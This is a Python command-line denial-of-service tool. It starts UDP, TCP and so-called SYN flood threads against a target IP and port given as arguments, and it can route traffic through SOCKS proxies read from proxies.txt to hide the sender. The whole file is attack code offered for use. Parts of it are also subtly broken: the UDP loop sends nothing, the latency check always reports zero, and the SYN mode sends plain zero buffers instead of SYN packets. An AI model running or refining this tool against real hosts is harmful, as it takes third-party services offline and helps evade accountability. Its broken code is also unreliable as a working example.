import os
import random
import socket
import sys
import threading
import time

import socks

# Color log
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"

proxies = []
use_proxy = False
proxy_type = socks.SOCKS5


def generate_payload(size, mode="random"):
    if mode == "null":
        return b"\x00" * size
    elif mode == "text":
        return ("A" * size).encode()
    elif mode == "ascii":
        return "".join([chr(random.randint(33, 126)) for _ in range(size)]).encode()
    else:
        return random._urandom(size)


def timestamp():
    return time.strftime("%H:%M:%S")


def get_socket_with_proxy():
    raw = random.choice(proxies)
    parts = raw.strip().split(":")

    if len(parts) == 4:
        ip, port, username, password = parts
        sock = socks.socksocket()
        sock.set_proxy(proxy_type, ip, int(port), username=username, password=password)
    else:
        ip, port = parts
        sock = socks.socksocket()
        sock.set_proxy(proxy_type, ip, int(port))
    return sock


def udp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
    payload = b"\x00" * (1 * 1024 * 1024)
    sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(5)]
    sent = 0
    delay = 0

    while True:
        try:
            for sock in sockets:
                for _ in range(500):  
                    sent += 1
            if sent % 100000 == 0:
                print(f"{CYAN}[{timestamp()}][UDP-{thread_id}] Packets: {sent}{RESET}")
        except Exception as e:
            print(f"{RED}[UDP-{thread_id}] Error: {e}{RESET}")
            time.sleep(delay)
            delay = min(0.1, delay + 0.001)


def tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
    payload = b"\x00" * (1 * 1024 * 1024)
    packet_count = 100000
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(3)
            sock.connect((target_ip, target_port))

            for i in range(packet_count):
                sock.sendall(payload)
                if i % 5000 == 0:
                    print(f"[TCP-{thread_id}] Đã gửi: {i}/{packet_count}")
    except Exception as e:
        print(f"[TCP-{thread_id}] Lỗi: {e}")


def syn_flood(target_ip, target_port, thread_id):
    sent = 0
    while True:
        try:
            sock = (
                get_socket_with_proxy()
                if use_proxy
                else socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            )
            packet = b"\x00" * (1 * 1024 * 1024)
            sock.sendto(packet, (target_ip, target_port))
            sent += 1
            if sent % 100 == 0:
                print(f"{GREEN}[{timestamp()}][SYN-{thread_id}] Packets: {sent}{RESET}")
        except PermissionError:
            print(f"{RED}[SYN-{thread_id}] Root required!{RESET}")
            return
        except Exception as e:
            print(f"{RED}[SYN-{thread_id}] Error: {e}{RESET}")
            time.sleep(0.1)


def check_latency(ip, port):
    print(f"{CYAN}[+] Checking latency to {ip}:{port}...{RESET}")
    try:
        sock = socket.create_connection((ip, port), timeout=2)
        sock.close()
        latency = (time.time() - time.time()) * 1000
        print(f"{GREEN}[✓] Latency: {latency:.2f} ms{RESET}")
    except Exception as e:
        print(f"{RED}[x] Latency check failed: {e}{RESET}")


def load_proxies():
    global use_proxy
    if os.path.exists("proxies.txt"):
        with open("proxies.txt") as f:
            for line in f:
                line = line.strip()
                if line and (":" in line):
                    proxies.append(line)
        use_proxy = len(proxies) > 0
        if use_proxy:
            print(f"{YELLOW}[!] Loaded {len(proxies)} proxies from proxies.txt{RESET}")


def main():
    global proxy_type
    if len(sys.argv) < 6:
        print(
            f"Usage: python3 {sys.argv[0]} <ip> <port> <threads> <packet_size> <protocol> [payload_mode] [--proxy-type socks4|socks5]"
        )
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    threads = int(sys.argv[3])
    packet_size = int(sys.argv[4])
    protocol = sys.argv[5].lower()
    payload_mode = (
        sys.argv[6].lower()
        if len(sys.argv) > 6 and not sys.argv[6].startswith("--")
        else "random"
    )

    if "--proxy-type" in sys.argv:
        idx = sys.argv.index("--proxy-type")
        if idx + 1 < len(sys.argv):
            ptype = sys.argv[idx + 1].lower()
            if ptype == "socks4":
                proxy_type = socks.SOCKS4
            elif ptype == "socks5":
                proxy_type = socks.SOCKS5

    load_proxies()

    print(f"{CYAN}[*] Target: {target_ip}:{target_port}{RESET}")
    print(
        f"{CYAN}[*] Threads: {threads}, Size: {packet_size}, Protocol: {protocol.upper()}, Payload: {payload_mode}{RESET}"
    )
    if use_proxy:
        print(
            f"{CYAN}[*] Using proxies with type: {'SOCKS4' if proxy_type == socks.SOCKS4 else 'SOCKS5'}{RESET}"
        )

    if protocol in ("tcp", "udp"):
        check_latency(target_ip, target_port)

    threads_list = []
    for i in range(threads):
        if protocol == "udp":
            t = threading.Thread(
                target=udp_flood,
                args=(target_ip, target_port, packet_size, i + 1, payload_mode),
            )
            threads_list.append(t)
            t.start()

        elif protocol == "tcp":
            t = threading.Thread(
                target=tcp_flood,
                args=(target_ip, target_port, packet_size, i + 1, payload_mode),
            )
            threads_list.append(t)
            t.start()
        elif protocol == "syn":
            t = threading.Thread(target=syn_flood, args=(target_ip, target_port, i + 1))
            threads_list.append(t)
            t.start()
        else:
            print(f"{RED}Invalid protocol{RESET}")
            sys.exit(1)

    for t in threads_list:
        t.join()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print(f"{YELLOW}[!] Exiting...{RESET}")


if __name__ == "__main__":
    main()
